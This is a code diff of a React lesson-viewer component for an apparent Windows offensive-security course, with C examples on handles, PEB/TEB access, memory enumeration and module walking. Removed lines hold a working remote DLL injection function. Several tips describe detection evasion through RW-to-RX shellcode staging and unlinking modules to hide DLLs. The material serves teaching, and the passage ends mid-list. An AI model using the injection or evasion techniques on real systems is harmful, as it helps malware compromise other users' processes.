@@ -1,7 +1,8 @@
 import { Card } from "@/components/ui/card";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Badge } from "@/components/ui/badge";
-import { BookOpen, Lightbulb, AlertTriangle, Code, Sparkles, CheckCircle2 } from "lucide-react";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { BookOpen, Lightbulb, AlertTriangle, Code, Sparkles, CheckCircle2, Brain, Target, FileText, Layers } from "lucide-react";
 
 interface LessonViewerProps {
   moduleId: string;
@@ -11,39 +12,141 @@ const LessonViewer = ({ moduleId }: LessonViewerProps) => {
   const lessons: Record<string, any> = {
     fundamentals: {
       title: "C/C++ WinAPI Fundamentals",
-      description: "Learn the essential building blocks of Windows programming",
+      description: "Master the foundational concepts of Windows systems programming",
       sections: [
         {
           type: "intro",
-          content: `Welcome! In this module, you'll learn the basics of Windows programming. Don't worry if you're new to this - we'll explain everything step by step with plenty of examples.`
+          content: `This module establishes your foundation in Windows systems programming. You'll understand how Windows manages resources, why Microsoft created specific data types, and how to properly interact with the operating system through its API.`
         },
         {
-          title: "Windows Data Types - Why They Matter",
-          content: `Think of Windows data types as a special language Microsoft created to make sure programs work correctly on all computers.
+          title: "Understanding Windows Architecture",
+          content: `Windows operates on a layered architecture model that separates user-mode applications from the kernel. This separation is crucial for system stability and security.
 
-**The Problem:** If you use regular 'int', it might be different sizes on different computers.
-**The Solution:** Windows types like DWORD are ALWAYS the same size everywhere.`,
-          tip: `Think of these types as "guaranteed sizes" - DWORD is ALWAYS 32 bits, no matter what computer you're on.`,
+**User Mode vs Kernel Mode:**
+User-mode applications cannot directly access hardware or system memory. Instead, they must request services through the Windows API, which then transitions to kernel mode to perform privileged operations.
+
+**The Windows API Hierarchy:**
+• Win32 API (kernel32.dll, user32.dll, gdi32.dll)
+• Native API (ntdll.dll)
+• System Service Dispatcher
+• Kernel (ntoskrnl.exe)`,
+          tip: `Understanding this hierarchy is essential - security tools often hook at different levels to monitor or modify behavior.`,
           concepts: [
-            { label: "BYTE", explanation: "8 bits (0-255) - Use for small numbers or single characters" },
-            { label: "WORD", explanation: "16 bits (0-65,535) - Rarely used today" },
-            { label: "DWORD", explanation: "32 bits - Most common, use for IDs, sizes, counts" },
-            { label: "HANDLE", explanation: "A reference ticket to a Windows resource (file, process, etc.)" }
-          ],
+            { label: "User Mode", explanation: "Ring 3 - Limited access, where normal applications run. Cannot directly access hardware." },
+            { label: "Kernel Mode", explanation: "Ring 0 - Full system access, where drivers and the OS kernel operate." },
+            { label: "System Call", explanation: "The transition mechanism from user mode to kernel mode to request OS services." },
+            { label: "Subsystem", explanation: "Windows supports multiple subsystems (Win32, WSL) that provide different APIs." }
+          ]
+        },
+        {
+          title: "Windows Data Types - Precision Matters",
+          content: `Microsoft defined specific data types to ensure consistent behavior across different compiler implementations and processor architectures.
+
+**Why Standard C Types Aren't Enough:**
+The C standard allows 'int' to be 16, 32, or 64 bits depending on the platform. Windows data types guarantee exact sizes:
+
+**Unsigned Integer Types:**
+• BYTE (8-bit) - Used for raw binary data, single characters
+• WORD (16-bit) - Legacy DOS compatibility, some registry values  
+• DWORD (32-bit) - Most common: process IDs, error codes, flags
+• QWORD (64-bit) - Large values, 64-bit addresses on x64
+
+**Pointer Types:**
+• PVOID - Generic pointer (void*)
+• LPVOID - Long pointer to void (same as PVOID on modern Windows)
+• SIZE_T - Unsigned integer sized to match pointer width (32 or 64 bits)
+• ULONG_PTR - Unsigned long sized to hold a pointer
+
+**String Types:**
+• LPSTR - Pointer to ANSI string (char*)
+• LPWSTR - Pointer to Unicode string (wchar_t*)
+• LPTSTR - Pointer to TCHAR string (Unicode or ANSI based on build)`,
+          warning: `Always use SIZE_T for memory sizes and ULONG_PTR for pointer arithmetic. Using DWORD on 64-bit systems will truncate addresses!`,
           example: {
-            title: "Simple Example - Using Windows Types",
-            description: "Here's how you use these types in real code:",
+            title: "Type Sizes and Safe Usage",
+            description: "Demonstrating proper type usage for cross-platform compatibility:",
             code: `#include <windows.h>
 #include <stdio.h>
 
 int main() {
-    // Process ID - use DWORD
-    DWORD processId = GetCurrentProcessId();
-    printf("My PID: %lu\\n", processId);
+    // Integer types with guaranteed sizes
+    BYTE   b = 255;           // 8-bit:  0-255
+    WORD   w = 65535;         // 16-bit: 0-65535  
+    DWORD  dw = 4294967295;   // 32-bit: 0-4.2B
     
-    // Handle to a file
-    HANDLE hFile = CreateFileW(
-        L"test.txt",
+    // Pointer-sized types - CRITICAL for 64-bit
+    SIZE_T memSize = 0x10000;     // Safe for VirtualAlloc
+    ULONG_PTR addr = (ULONG_PTR)&b; // Safe pointer math
+    
+    printf("BYTE size:     %zu bytes\\n", sizeof(BYTE));
+    printf("DWORD size:    %zu bytes\\n", sizeof(DWORD));
+    printf("SIZE_T size:   %zu bytes\\n", sizeof(SIZE_T));
+    printf("Pointer size:  %zu bytes\\n", sizeof(PVOID));
+    
+    // String types
+    LPCSTR  ansiStr = "ANSI string";     // const char*
+    LPCWSTR wideStr = L"Unicode string"; // const wchar_t*
+    
+    printf("ANSI: %s\\n", ansiStr);
+    wprintf(L"Wide: %s\\n", wideStr);
+    
+    return 0;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "The Handle System - Object Management",
+          content: `Windows uses handles as opaque references to kernel objects. This abstraction provides security isolation and allows the kernel to manage resources without exposing internal structures.
+
+**Why Handles Exist:**
+• Security: Applications can't directly access kernel memory
+• Abstraction: Kernel can change internal structures without breaking apps
+• Reference Counting: Kernel tracks how many handles point to an object
+• Per-Process: Handle values are only valid within their owning process
+
+**Handle Types:**
+Each handle references a specific object type:
+• Process handles (PROCESS_ALL_ACCESS, PROCESS_VM_READ, etc.)
+• Thread handles (THREAD_QUERY_INFORMATION, etc.)
+• File handles (GENERIC_READ, GENERIC_WRITE)
+• Registry key handles
+• Event, mutex, semaphore handles
+
+**The Handle Table:**
+Each process has a private handle table that maps handle values to kernel object pointers. Handle values are indices into this table, multiplied by 4.`,
+          concepts: [
+            { label: "INVALID_HANDLE_VALUE", explanation: "-1 cast to HANDLE. Returned by CreateFile on failure." },
+            { label: "NULL", explanation: "0. Returned by most other functions on failure (OpenProcess, etc.)." },
+            { label: "Pseudo-Handle", explanation: "Special values like GetCurrentProcess() that don't need closing." },
+            { label: "Handle Leak", explanation: "Forgetting CloseHandle() causes resource exhaustion over time." }
+          ],
+          example: {
+            title: "Proper Handle Management",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+// RAII-style handle wrapper concept
+void DemonstrateHandles() {
+    HANDLE hProcess = NULL;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    
+    // Opening a process - returns NULL on failure
+    hProcess = OpenProcess(
+        PROCESS_QUERY_LIMITED_INFORMATION,
+        FALSE,
+        GetCurrentProcessId()
+    );
+    
+    if (hProcess == NULL) {
+        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
+        goto cleanup;
+    }
+    printf("[+] Process handle: 0x%p\\n", hProcess);
+    
+    // Opening a file - returns INVALID_HANDLE_VALUE on failure
+    hFile = CreateFileW(
+        L"C:\\\\Windows\\\\System32\\\\kernel32.dll",
         GENERIC_READ,
         FILE_SHARE_READ,
         NULL,
@@ -53,146 +156,203 @@ int main() {
     );
     
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Failed to open file!\\n");
-        return 1;
+        printf("[-] CreateFile failed: %lu\\n", GetLastError());
+        goto cleanup;
     }
     
-    printf("File opened!\\n");
-    CloseHandle(hFile);
-    return 0;
+    // Get file size using handle
+    LARGE_INTEGER fileSize;
+    if (GetFileSizeEx(hFile, &fileSize)) {
+        printf("[+] kernel32.dll size: %lld bytes\\n", fileSize.QuadPart);
+    }
+
+cleanup:
+    // ALWAYS close handles in reverse order of acquisition
+    if (hFile != INVALID_HANDLE_VALUE) {
+        CloseHandle(hFile);
+    }
+    if (hProcess != NULL) {
+        CloseHandle(hProcess);
+    }
 }`,
             language: "c"
           },
-          warning: `Never forget to call CloseHandle()! If you don't close handles, your program will leak resources.`
+          warning: `Different functions return different invalid values! CreateFile returns INVALID_HANDLE_VALUE (-1), while OpenProcess returns NULL (0). Always check the documentation.`
         },
         {
-          title: "Handles - Your Access Tickets",
-          content: `A HANDLE is like a ticket that Windows gives you to use something. You can't access Windows resources directly (that would be unsafe!), so Windows gives you a "ticket" instead.
+          title: "Error Handling - GetLastError() Deep Dive",
+          content: `Windows API functions communicate failure through return values and a thread-local error code retrievable via GetLastError().
 
-**Real World Analogy:**
-• You give a coat check your coat
-• They give you a ticket (HANDLE)
-• When you show the ticket, they give you your coat back
-• The ticket is only valid in that location`,
-          tip: `Handles are like claim tickets - they're only valid in your program.`,
+**The Error Model:**
+1. Function returns a failure indicator (NULL, FALSE, INVALID_HANDLE_VALUE, -1)
+2. GetLastError() returns the specific error code
+3. Error codes are DWORD values defined in winerror.h
+
+**Critical Rules:**
+• Call GetLastError() IMMEDIATELY after the failed function
+• Any subsequent Windows API call may overwrite the error code
+• Some functions (like CreateFile with CREATE_ALWAYS) set error codes even on success
+
+**Common Error Codes:**
+• ERROR_SUCCESS (0) - Operation completed successfully
+• ERROR_FILE_NOT_FOUND (2) - File does not exist
+• ERROR_ACCESS_DENIED (5) - Insufficient privileges
+• ERROR_INVALID_HANDLE (6) - Handle is invalid or closed
+• ERROR_NOT_ENOUGH_MEMORY (8) - Memory allocation failed
+• ERROR_INVALID_PARAMETER (87) - Bad argument passed`,
           example: {
-            title: "Working with Process Handles",
+            title: "Comprehensive Error Handling",
             code: `#include <windows.h>
 #include <stdio.h>
 
-int main() {
-    DWORD targetPID = 1234;  // Replace with real PID
+void PrintWindowsError(LPCSTR operation) {
+    DWORD errorCode = GetLastError();
+    LPWSTR messageBuffer = NULL;
     
-    HANDLE hProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION,
-        FALSE,
-        targetPID
+    // Convert error code to human-readable message
+    DWORD size = FormatMessageW(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        errorCode,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPWSTR)&messageBuffer,
+        0,
+        NULL
     );
     
-    if (hProcess == NULL) {
-        DWORD error = GetLastError();
-        printf("Failed! Error: %lu\\n", error);
-        if (error == 5) {
-            printf("Access Denied - try Administrator\\n");
-        }
-        return 1;
-    }
+    printf("[-] %s failed\\n", operation);
+    printf("    Error Code: %lu (0x%08lX)\\n", errorCode, errorCode);
     
-    printf("Got handle: 0x%p\\n", hProcess);
-    CloseHandle(hProcess);
-    return 0;
-}`,
-            language: "c"
-          }
-        },
-        {
-          title: "Error Handling",
-          content: `In Windows programming, things fail ALL THE TIME. You MUST check for errors!
-
-**The Pattern:**
-1. Call a Windows function
-2. Check if it failed
-3. Call GetLastError() to find out why`,
-          warning: `Never ignore return values! If you don't check for errors, your program will crash.`,
-          example: {
-            title: "Proper Error Handling",
-            code: `#include <windows.h>
-#include <stdio.h>
-
-void PrintError(const char* op) {
-    DWORD error = GetLastError();
-    printf("[ERROR] %s failed: %lu\\n", op, error);
+    if (messageBuffer) {
+        wprintf(L"    Message: %s", messageBuffer);
+        LocalFree(messageBuffer);
+    }
 }
 
 int main() {
+    // Attempt to open non-existent file
     HANDLE hFile = CreateFileW(
-        L"nonexistent.txt",
+        L"C:\\\\ThisFileDoesNotExist.txt",
         GENERIC_READ, 0, NULL,
         OPEN_EXISTING, 0, NULL
     );
     
     if (hFile == INVALID_HANDLE_VALUE) {
-        PrintError("CreateFile");
-        return 1;
+        PrintWindowsError("CreateFile");
     }
     
-    CloseHandle(hFile);
+    // Attempt to open protected process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        4  // System process PID
+    );
+    
+    if (hProcess == NULL) {
+        PrintWindowsError("OpenProcess(System)");
+    }
+    
     return 0;
 }`,
             language: "c"
           },
-          tip: `Common error codes: ERROR_ACCESS_DENIED (5), ERROR_FILE_NOT_FOUND (2), ERROR_INVALID_PARAMETER (87)`
+          tip: `Use SetLastError(0) before calling a function if you need to distinguish between "function succeeded" and "function failed with ERROR_SUCCESS".`
         }
       ]
     },
     "windows-internals": {
-      title: "Windows Internals & Win32 API",
-      description: "Master Windows architecture, processes, threads, and the Win32 API",
+      title: "Windows Internals & Architecture",
+      description: "Deep dive into Windows architecture, process structures, and memory management",
       sections: [
         {
           type: "intro",
-          content: `Welcome to Windows Internals! Here you'll learn how Windows really works under the hood - processes, threads, memory, and the powerful Win32 API.`
+          content: `This module explores Windows internals - the structures and mechanisms that the operating system uses to manage processes, memory, and security. Understanding these concepts is essential for advanced security research, malware analysis, and exploit development.`
         },
         {
-          title: "Process Architecture",
-          content: `A process is like a container for a running program. It has its own memory space, handles, and one or more threads.
+          title: "Process Architecture - Deep Dive",
+          content: `A Windows process is more than just running code - it's a complex container managed by the kernel with numerous internal structures.
 
-**What makes up a process:**
-• Virtual address space (memory)
-• Executable code
-• Open handles to system objects
-• Security context (token)
-• One or more threads of execution`,
+**Process Components:**
+• Private Virtual Address Space (user-mode: 0 to 0x7FFFFFFFFFFF on x64)
+• Handle table for kernel objects
+• Access token defining security context
+• Private working set (physical memory pages)
+• One or more threads
+
+**Key Process Structures:**
+1. **EPROCESS** (Kernel Mode) - Executive Process Block
+   - Contains process accounting, security info, handle table pointer
+   - Linked list connects all processes for enumeration
+
+2. **PEB** (User Mode) - Process Environment Block
+   - Located at a fixed offset from TEB (gs:[0x60] on x64)
+   - Contains image base, loader data (loaded DLLs), process parameters
+   - Frequently accessed for process introspection
+
+3. **KPROCESS** - Kernel Process Block
+   - Embedded within EPROCESS
+   - Contains scheduling information, processor affinity`,
           concepts: [
-            { label: "Process", explanation: "A container for code execution with its own memory space" },
-            { label: "Thread", explanation: "The actual unit that executes code - a process has at least one" },
-            { label: "PEB", explanation: "Process Environment Block - contains process info like loaded DLLs" },
-            { label: "TEB", explanation: "Thread Environment Block - per-thread data structure" }
+            { label: "EPROCESS", explanation: "Kernel structure containing all process management data. Not directly accessible from user mode." },
+            { label: "PEB", explanation: "User-mode structure at gs:[0x60]. Contains DLL list, image base, environment variables." },
+            { label: "VAD Tree", explanation: "Virtual Address Descriptor tree tracks all memory allocations in the process." },
+            { label: "Working Set", explanation: "The set of physical memory pages currently mapped for the process." }
           ],
           example: {
-            title: "Get Process Information",
-            description: "Query basic process information:",
+            title: "Reading PEB Information",
+            description: "Accessing the Process Environment Block for introspection:",
             code: `#include <windows.h>
+#include <winternl.h>
 #include <stdio.h>
 
+// PEB structure (partial - defined in winternl.h)
+typedef struct _PEB_FULL {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    PVOID Reserved3[2];
+    PVOID Ldr;  // PEB_LDR_DATA*
+    PVOID ProcessParameters;
+    PVOID Reserved4[3];
+    PVOID AtlThunkSListPtr;
+    PVOID Reserved5;
+    ULONG Reserved6;
+    PVOID Reserved7;
+    ULONG Reserved8;
+    ULONG AtlThunkSListPtr32;
+    PVOID Reserved9[45];
+    BYTE Reserved10[96];
+    PVOID PostProcessInitRoutine;
+    BYTE Reserved11[128];
+    PVOID Reserved12[1];
+    ULONG SessionId;
+} PEB_FULL;
+
 int main() {
-    // Get our own process info
-    DWORD pid = GetCurrentProcessId();
-    HANDLE hProcess = GetCurrentProcess();
+    // Method 1: NtQueryInformationProcess
+    PROCESS_BASIC_INFORMATION pbi;
+    ULONG returnLength;
     
-    printf("Process ID: %lu\\n", pid);
-    printf("Handle: 0x%p\\n", hProcess);
+    NTSTATUS status = NtQueryInformationProcess(
+        GetCurrentProcess(),
+        ProcessBasicInformation,
+        &pbi,
+        sizeof(pbi),
+        &returnLength
+    );
     
-    // Query memory info
-    PROCESS_MEMORY_COUNTERS pmc;
-    pmc.cb = sizeof(pmc);
-    
-    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
-        printf("Working Set: %llu KB\\n", 
-            pmc.WorkingSetSize / 1024);
-        printf("Page Faults: %lu\\n", 
-            pmc.PageFaultCount);
+    if (NT_SUCCESS(status)) {
+        PEB* peb = pbi.PebBaseAddress;
+        printf("[+] PEB Address: 0x%p\\n", peb);
+        printf("[+] ImageBase:   0x%p\\n", peb->Reserved3[1]);
+        printf("[+] Being Debugged: %s\\n", 
+               peb->BeingDebugged ? "Yes" : "No");
     }
+    
+    // Method 2: Direct TEB access (x64)
+    // PEB* peb = (PEB*)__readgsqword(0x60);
     
     return 0;
 }`,
@@ -200,425 +360,899 @@ int main() {
           }
         },
         {
-          title: "Enumerating Processes",
-          content: `One of the most common tasks is listing all running processes. The Toolhelp API makes this easy.
+          title: "Thread Structures and TEB",
+          content: `Threads are the actual execution units within a process. Each thread has its own stack, register context, and Thread Environment Block.
 
-**Steps:**
-1. Create a snapshot of the system
-2. Loop through all processes
-3. Get details from PROCESSENTRY32`,
-          tip: `Always set pe32.dwSize = sizeof(pe32) before calling Process32First - this is a very common bug!`,
+**Thread Components:**
+• Stack (user-mode and kernel-mode stacks)
+• Context (CPU registers: RIP, RSP, RAX, etc.)
+• Thread Environment Block (TEB)
+• Thread-Local Storage (TLS)
+• Exception handling chain
+
+**TEB Structure (Thread Environment Block):**
+The TEB is located at gs:[0] on x64 and contains:
+• Stack limits (base and limit)
+• PEB pointer at offset 0x60
+• Thread ID at offset 0x48
+• Last error value at offset 0x68
+• TLS array pointer
+
+**Accessing TEB:**
+• x64: gs register points to TEB
+• x86: fs register points to TEB
+• NtCurrentTeb() returns TEB pointer`,
           example: {
-            title: "List All Processes",
-            code: `#include <windows.h>
-#include <tlhelp32.h>
-#include <stdio.h>
-
-int main() {
-    HANDLE hSnap = CreateToolhelp32Snapshot(
-        TH32CS_SNAPPROCESS, 0
-    );
-    
-    if (hSnap == INVALID_HANDLE_VALUE) {
-        printf("Snapshot failed\\n");
-        return 1;
-    }
-    
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(pe32);  // IMPORTANT!
-    
-    if (Process32FirstW(hSnap, &pe32)) {
-        do {
-            wprintf(L"[%5lu] %s\\n", 
-                pe32.th32ProcessID,
-                pe32.szExeFile);
-        } while (Process32NextW(hSnap, &pe32));
-    }
-    
-    CloseHandle(hSnap);
-    return 0;
-}`,
-            language: "c"
-          }
-        },
-        {
-          title: "Virtual Memory",
-          content: `Windows uses virtual memory - each process thinks it has its own private memory space. The OS maps virtual addresses to physical RAM.
-
-**Key concepts:**
-• Each process has 4GB (32-bit) or 128TB (64-bit) virtual space
-• Pages are 4KB chunks of memory
-• Memory can be Reserved, Committed, or Free`,
-          concepts: [
-            { label: "VirtualAlloc", explanation: "Allocates memory in your process" },
-            { label: "VirtualAllocEx", explanation: "Allocates memory in another process" },
-            { label: "VirtualProtect", explanation: "Changes memory protection (RWX permissions)" },
-            { label: "VirtualFree", explanation: "Releases allocated memory" }
-          ],
-          example: {
-            title: "Allocate and Use Memory",
+            title: "TEB Access and Thread Information",
             code: `#include <windows.h>
 #include <stdio.h>
 
+// TEB offsets for x64
+#define TEB_SELF_OFFSET           0x30
+#define TEB_PEB_OFFSET            0x60
+#define TEB_TID_OFFSET            0x48
+#define TEB_STACK_BASE_OFFSET     0x08
+#define TEB_STACK_LIMIT_OFFSET    0x10
+#define TEB_LAST_ERROR_OFFSET     0x68
+
 int main() {
-    // Allocate 4KB of memory
-    LPVOID mem = VirtualAlloc(
-        NULL,                    // Let Windows choose
-        4096,                    // Size in bytes
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE           // Read/write access
-    );
+    // Direct TEB access via GS segment
+    PVOID pTeb = (PVOID)__readgsqword(TEB_SELF_OFFSET);
+    PVOID pPeb = (PVOID)__readgsqword(TEB_PEB_OFFSET);
+    DWORD tid = (DWORD)__readgsqword(TEB_TID_OFFSET);
     
-    if (!mem) {
-        printf("Allocation failed\\n");
-        return 1;
-    }
+    PVOID stackBase = (PVOID)__readgsqword(TEB_STACK_BASE_OFFSET);
+    PVOID stackLimit = (PVOID)__readgsqword(TEB_STACK_LIMIT_OFFSET);
     
-    printf("Allocated at: 0x%p\\n", mem);
+    printf("[+] TEB Address:  0x%p\\n", pTeb);
+    printf("[+] PEB Address:  0x%p\\n", pPeb);
+    printf("[+] Thread ID:    %lu\\n", tid);
+    printf("[+] Stack Base:   0x%p\\n", stackBase);
+    printf("[+] Stack Limit:  0x%p\\n", stackLimit);
+    printf("[+] Stack Size:   %llu KB\\n", 
+        ((ULONG_PTR)stackBase - (ULONG_PTR)stackLimit) / 1024);
     
-    // Use the memory
-    strcpy((char*)mem, "Hello, Memory!");
-    printf("Content: %s\\n", (char*)mem);
+    // Verify with API
+    printf("\\n[*] Verification via API:\\n");
+    printf("    GetCurrentThreadId(): %lu\\n", GetCurrentThreadId());
     
-    // Free the memory
-    VirtualFree(mem, 0, MEM_RELEASE);
     return 0;
 }`,
             language: "c"
           },
-          warning: `Always free memory you allocate! Memory leaks can crash long-running programs.`
-        }
-      ]
-    },
-    "process-injection": {
-      title: "Process Injection & Memory",
-      description: "Advanced memory manipulation and process injection techniques",
-      sections: [
-        {
-          type: "intro",
-          content: `Process injection allows you to execute code in another process's context. This is used for debugging, security tools, and unfortunately, by malware. Understanding these techniques is crucial for both offense and defense.`
+          tip: `The TEB is crucial for shellcode - it provides access to the PEB, which leads to kernel32.dll and its exports like GetProcAddress and LoadLibrary.`
         },
         {
-          title: "Classic DLL Injection",
-          content: `The most common injection technique. You write the path to a DLL in the target process, then create a thread that calls LoadLibrary.
+          title: "Virtual Memory Architecture",
+          content: `Windows implements a virtual memory system that provides each process with its own isolated address space, enabling memory protection and efficient resource utilization.
 
-**Steps:**
-1. OpenProcess with appropriate rights
-2. VirtualAllocEx - allocate memory for the DLL path
-3. WriteProcessMemory - write the DLL path
-4. CreateRemoteThread - call LoadLibraryA`,
-          concepts: [
-            { label: "OpenProcess", explanation: "Get a handle with VM_WRITE and THREAD rights" },
-            { label: "VirtualAllocEx", explanation: "Allocate memory in target process" },
-            { label: "WriteProcessMemory", explanation: "Write data to target process" },
-            { label: "CreateRemoteThread", explanation: "Create a thread in target process" }
-          ],
-          warning: `This technique is heavily monitored by security products. Don't run on systems you don't own!`,
+**Address Space Layout (x64):**
+• 0x00000000\`00000000 - 0x00007FFF\`FFFFFFFF: User space (128TB)
+• 0xFFFF8000\`00000000 - 0xFFFFFFFF\`FFFFFFFF: Kernel space (128TB)
+
+**Memory States:**
+• FREE - Not allocated, not accessible
+• RESERVED - Address range claimed but no physical storage
+• COMMITTED - Physical storage (RAM or page file) backing the range
+
+**Page Protections:**
+• PAGE_NOACCESS - No access allowed
+• PAGE_READONLY - Read only
+• PAGE_READWRITE - Read/write, no execute
+• PAGE_EXECUTE_READ - Read and execute, common for code
+• PAGE_EXECUTE_READWRITE - Full access (suspicious for security tools)
+
+**Memory Types:**
+• Private - Process-private pages (VirtualAlloc)
+• Mapped - File-backed or shared memory
+• Image - Executable/DLL mappings`,
+          warning: `PAGE_EXECUTE_READWRITE is heavily monitored by security tools. Modern exploits allocate RW, write shellcode, then change to RX using VirtualProtect.`,
           example: {
-            title: "DLL Injection Steps",
+            title: "Memory Region Enumeration",
             code: `#include <windows.h>
 #include <stdio.h>
 
-BOOL InjectDLL(DWORD pid, const char* dllPath) {
-    // Step 1: Open the target process
-    HANDLE hProcess = OpenProcess(
-        PROCESS_ALL_ACCESS, FALSE, pid
-    );
-    if (!hProcess) return FALSE;
-    
-    // Step 2: Allocate memory for DLL path
-    size_t pathLen = strlen(dllPath) + 1;
-    LPVOID remoteMem = VirtualAllocEx(
-        hProcess, NULL, pathLen,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE
-    );
-    if (!remoteMem) {
-        CloseHandle(hProcess);
-        return FALSE;
+const char* GetProtectionString(DWORD protect) {
+    switch (protect & 0xFF) {
+        case PAGE_NOACCESS:          return "---";
+        case PAGE_READONLY:          return "R--";
+        case PAGE_READWRITE:         return "RW-";
+        case PAGE_EXECUTE:           return "--X";
+        case PAGE_EXECUTE_READ:      return "R-X";
+        case PAGE_EXECUTE_READWRITE: return "RWX";
+        default:                     return "???";
     }
-    
-    // Step 3: Write DLL path to target
-    WriteProcessMemory(
-        hProcess, remoteMem,
-        dllPath, pathLen, NULL
-    );
-    
-    // Step 4: Create remote thread
-    HANDLE hThread = CreateRemoteThread(
-        hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)LoadLibraryA,
-        remoteMem, 0, NULL
-    );
-    
-    if (hThread) {
-        WaitForSingleObject(hThread, INFINITE);
-        CloseHandle(hThread);
+}
+
+const char* GetTypeString(DWORD type) {
+    switch (type) {
+        case MEM_IMAGE:   return "Image";
+        case MEM_MAPPED:  return "Mapped";
+        case MEM_PRIVATE: return "Private";
+        default:          return "Unknown";
     }
+}
+
+void EnumerateMemory(HANDLE hProcess) {
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID address = NULL;
     
-    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-    return hThread != NULL;
+    printf("%-18s %-10s %-6s %-8s %-10s\\n",
+           "Address", "Size", "Prot", "Type", "State");
+    printf("─────────────────────────────────────────────────\\n");
+    
+    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+        if (mbi.State == MEM_COMMIT) {
+            printf("0x%016llX %-10llu %-6s %-8s Committed\\n",
+                (ULONGLONG)mbi.BaseAddress,
+                (ULONGLONG)mbi.RegionSize / 1024,
+                GetProtectionString(mbi.Protect),
+                GetTypeString(mbi.Type));
+        }
+        
+        address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
+    }
+}
+
+int main() {
+    printf("[*] Enumerating current process memory...\\n\\n");
+    EnumerateMemory(GetCurrentProcess());
+    return 0;
 }`,
             language: "c"
           }
         },
         {
-          title: "Shellcode Injection",
-          content: `Instead of loading a DLL, you can inject raw shellcode (position-independent code) directly.
+          title: "DLL Loading and the Loader",
+          content: `The Windows loader (ntdll.dll) is responsible for mapping executables and their dependencies into memory. Understanding this process is crucial for techniques like DLL injection and reflective loading.
 
-**The difference:**
-• DLL Injection: Loads a file from disk (leaves traces)
-• Shellcode Injection: Everything in memory (stealthier)`,
-          tip: `Shellcode must be position-independent - it can't rely on fixed addresses because you don't know where it will land.`,
+**Load Order:**
+1. Create process address space
+2. Map ntdll.dll (always first)
+3. Initialize the loader
+4. Parse PE import table
+5. Load dependent DLLs recursively
+6. Call DllMain for each loaded DLL
+7. Call executable entry point
+
+**Key Loader Structures (in PEB):**
+• PEB_LDR_DATA - Contains linked lists of loaded modules
+• LDR_DATA_TABLE_ENTRY - Per-module information
+  - BaseDllName: Module name
+  - DllBase: Load address
+  - EntryPoint: DllMain address
+  - SizeOfImage: Module size in memory
+
+**Module Lists:**
+Three doubly-linked lists in different orders:
+• InLoadOrderModuleList - Order modules were loaded
+• InMemoryOrderModuleList - Order by memory address
+• InInitializationOrderModuleList - DllMain call order`,
           example: {
-            title: "Basic Shellcode Injection",
+            title: "Walking the Loaded Module List",
+            code: `#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    // ... more fields
+} LDR_DATA_TABLE_ENTRY_FULL;
+
+void WalkModuleList() {
+    // Get PEB
+    PEB* peb = (PEB*)__readgsqword(0x60);
+    
+    // Get loader data
+    PEB_LDR_DATA* ldr = (PEB_LDR_DATA*)peb->Ldr;
+    
+    // Walk InMemoryOrderModuleList
+    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* current = head->Flink;
+    
+    printf("[*] Loaded Modules (Memory Order):\\n\\n");
+    printf("%-18s %-10s %s\\n", "Base Address", "Size", "Name");
+    printf("──────────────────────────────────────────────\\n");
+    
+    while (current != head) {
+        // Entry is offset by InMemoryOrderLinks
+        LDR_DATA_TABLE_ENTRY_FULL* entry = CONTAINING_RECORD(
+            current,
+            LDR_DATA_TABLE_ENTRY_FULL,
+            InMemoryOrderLinks
+        );
+        
+        wprintf(L"0x%016llX %-10lu %wZ\\n",
+            (ULONGLONG)entry->DllBase,
+            entry->SizeOfImage,
+            &entry->BaseDllName);
+        
+        current = current->Flink;
+    }
+}
+
+int main() {
+    WalkModuleList();
+    return 0;
+}`,
+            language: "c"
+          },
+          tip: `Security tools monitor the PEB module lists. Techniques like "unlinking" remove modules from these lists to hide loaded DLLs, though this can cause crashes during exception handling.`
+        }
+      ]
+    },
+    "process-injection": {
+      title: "Process Injection Techniques",
+      description: "Advanced memory manipulation and code execution in remote processes",
+      sections: [
+        {
+          type: "intro",
+          content: `Process injection allows code execution in the context of another process. This is used legitimately for debugging and monitoring, but also by malware to evade detection, gain privileges, or persist. Understanding these techniques is essential for both offensive security and detection engineering.`
+        },
+        {
+          title: "Classic DLL Injection",
+          content: `The most straightforward injection technique: force a target process to load a malicious DLL using CreateRemoteThread and LoadLibrary.
+
+**The Process:**
+1. Open target process with appropriate access rights
+2. Allocate memory in target for DLL path string
+3. Write DLL path to allocated memory
+4. Get address of LoadLibraryW in kernel32.dll
+5. Create remote thread starting at LoadLibraryW with DLL path as argument
+6. DLL's DllMain executes in target process context
+
+**Required Access Rights:**
+• PROCESS_CREATE_THREAD - Create thread in target
